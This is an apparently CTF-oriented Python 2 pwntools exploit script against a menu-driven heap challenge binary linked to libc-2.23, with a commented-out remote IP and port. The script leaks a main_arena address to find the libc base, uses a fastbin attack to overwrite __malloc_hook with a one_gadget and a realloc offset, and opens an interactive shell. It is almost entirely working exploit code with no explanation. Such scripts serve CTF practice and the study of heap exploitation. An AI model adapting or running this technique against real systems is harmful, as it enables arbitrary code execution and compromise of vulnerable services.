#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

context.arch = 'amd64'
context.log_level = 'debug'
execve_file = './pwn'
sh = process(execve_file)
# sh = remote('152.136.21.148', 48138)
elf = ELF(execve_file)
libc = ELF('./libc-2.23.so')

def add(size, index, content):
    sh.sendlineafter('choice >> \n', '1')
    sh.sendlineafter('Size : ', str(size))
    sh.sendlineafter('index: ', str(index))
    sh.sendafter('name:\n', content)

def remove(index):
    sh.sendlineafter('choice >> \n', '2')
    sh.sendlineafter('idx :', str(index))

def show(index):
    sh.sendlineafter('choice >> \n', '3')
    sh.sendlineafter('idx :', str(index))

for i in range(6):
    add(0x58, i, '\n')

for i in range(5):
    remove(i)

add(0x28, 4, '\n')

sh.sendlineafter('choice >> \n', '0' * 0x400)

add(0x58, 0, 'a' * 0x50 + p64(0x61))
add(0x18, 1, '\n')
add(0x50, 2, '\n')
add(0x48, 3, '\n')
remove(1)
remove(5)
add(0x48, 5, '\n')
sh.sendlineafter('choice >> \n', '0' * 0x400)

add(0x18, 0, '\n')
add(0x18, 1, '\n')
show(2)
sh.recvuntil('flowers : ')
result = sh.recvuntil('1.', drop=True)
main_arena_addr = u64(result.ljust(8, '\x00')) - 88
log.success('main_arena_addr: ' + hex(main_arena_addr))

libc_addr = main_arena_addr - (libc.symbols['__malloc_hook'] + 0x10)
log.success('libc_addr: ' + hex(libc_addr))

remove(3)
remove(4)

add(0x38, 3, '\n')
add(0x50, 4, 'a'*0x10 + p64(0) + p64(0x51) + p64(main_arena_addr+0xd))

add(0x48, 1, '\n')

add(0x48, 0, '\x00' * 0x3b + p64(main_arena_addr - 0x28))
add(0x50, 2, '\n')
add(0x50, 2, '\n')
add(0x50, 2, '\n')
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
add(0x50, 2, p64(libc_addr + 0xf1147) + p64(libc_addr + libc.symbols['realloc'] + 20))

sh.sendlineafter('choice >> \n', '1')
sh.sendlineafter('Size : ', str(1))
sh.sendlineafter('index: ', str(1))

sh.interactive()
clear()
